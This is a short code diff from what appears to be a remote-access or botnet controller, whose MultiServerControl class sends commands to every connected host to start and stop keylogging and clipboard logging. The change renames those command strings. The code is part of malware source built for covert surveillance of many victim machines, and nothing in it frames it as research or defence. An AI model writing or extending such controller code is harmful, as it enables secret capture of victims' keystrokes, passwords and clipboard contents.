@@ -780,15 +780,15 @@ class MultiServerControl:
             for sock in self.get_socks():
                 host = SingleServer(sock, 0)
                 if action == 'start':
-                    buffer_send_data(b'keyscan_start', host.socket_obj)
+                    buffer_send_data(b'start_keylogger', host.socket_obj)
                     host.start_logging('Keylogger')
-                    buffer_send_data(b'clipscan_start', host.socket_obj)
+                    buffer_send_data(b'start_cliplogger', host.socket_obj)
                     host.start_logging('Cliplogger')
 
                 elif action == 'stop':
-                    buffer_send_data(b'keyscan_stop', host.socket_obj)
+                    buffer_send_data(b'stop_keylogger', host.socket_obj)
                     host.stop_logging('Keylogger')
-                    buffer_send_data(b'clipscan_stop', host.socket_obj)
+                    buffer_send_data(b'stop_cliplogger', host.socket_obj)
                     host.stop_logging('Cliplogger')
 
     def deploy_execute(self, command):
